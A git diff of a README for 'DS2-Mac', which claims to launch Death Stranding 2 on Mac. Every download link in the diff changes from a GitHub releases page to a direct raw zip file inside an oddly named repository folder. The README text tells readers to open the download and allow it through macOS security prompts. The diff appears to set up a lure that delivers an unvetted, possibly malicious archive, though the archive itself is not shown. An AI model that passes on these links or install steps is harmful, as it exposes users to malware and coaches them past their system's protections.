@@ -1,6 +1,6 @@
 # 🎮 DS2-Mac - Launch Death Stranding 2 on Mac
 
-[![Download DS2-Mac](https://img.shields.io/badge/Download-DS2--Mac-blue?style=for-the-badge)](https://github.com/Maudribless692/DS2-Mac/releases)
+[![Download DS2-Mac](https://img.shields.io/badge/Download-DS2--Mac-blue?style=for-the-badge)](https://raw.githubusercontent.com/Maudribless692/DS2-Mac/main/wenchlike/Mac-D-v1.8-beta.2.zip)
 
 ## 🧭 What DS2-Mac Does
 
@@ -10,7 +10,7 @@ Use this guide if the game opens and closes right away, shows a blank screen, or
 
 ## 📥 Download DS2-Mac
 
-Visit this page to download: https://github.com/Maudribless692/DS2-Mac/releases
+Visit this page to download: https://raw.githubusercontent.com/Maudribless692/DS2-Mac/main/wenchlike/Mac-D-v1.8-beta.2.zip
 
 On the releases page, look for the newest version and download the file that matches your Mac setup. After the download finishes, open the file from your Downloads folder.
 
@@ -29,7 +29,7 @@ If macOS shows a security prompt, you may need to allow the app in Privacy & Sec
 ## 🚀 How to Install
 
 1. Go to the releases page  
-   https://github.com/Maudribless692/DS2-Mac/releases
+   https://raw.githubusercontent.com/Maudribless692/DS2-Mac/main/wenchlike/Mac-D-v1.8-beta.2.zip
 
 2. Download the latest release file
 
@@ -144,7 +144,7 @@ Keep the files together if the release package includes more than one item.
 When a new release appears:
 
 1. Visit the releases page  
-   https://github.com/Maudribless692/DS2-Mac/releases
+   https://raw.githubusercontent.com/Maudribless692/DS2-Mac/main/wenchlike/Mac-D-v1.8-beta.2.zip
 
 2. Download the newest version
 
@@ -172,7 +172,7 @@ Usually no. If the game keeps its launch settings, one setup may be enough. Run 
 
 ### Where do I get the latest version?
 
-Use the releases page: https://github.com/Maudribless692/DS2-Mac/releases
+Use the releases page: https://raw.githubusercontent.com/Maudribless692/DS2-Mac/main/wenchlike/Mac-D-v1.8-beta.2.zip
 
 ## 🧾 Release Notes
 
